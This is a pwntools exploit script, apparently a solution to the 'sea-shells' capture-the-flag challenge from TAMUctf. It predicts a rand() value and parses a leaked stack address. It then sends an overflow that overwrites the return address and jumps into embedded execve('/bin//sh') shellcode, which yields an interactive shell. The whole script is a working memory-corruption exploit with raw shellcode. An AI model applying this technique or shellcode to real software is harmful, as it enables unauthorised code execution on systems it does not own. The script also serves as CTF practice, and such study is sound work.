from pwn import *


# p = remote("tamuctf.com", 443, ssl=True, sni="sea-shells")
p = process("./sea-shells")

p.recvuntil(b"can't!!\n")
p.recvline()

rand_num = 1804289383 & 0xffff # just compiled a c program which does rand()


#we want c+d to be rand_num
p.sendline(b"1") #a
p.sendline(b"1") #b
p.sendline(str(rand_num - 69).encode()) #c
p.sendline(b"69") #d

p.recvuntil(b"work: ")

leak = p.recvline()[:-1]
leak = int(leak, 16)
buf_address = leak + 39
jump_to = buf_address + 17 + 8 #skip padding and rip

shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p.sendline(b"\x00" * 17 + p64(jump_to) + shellcode)
p.clean()
p.interactive()
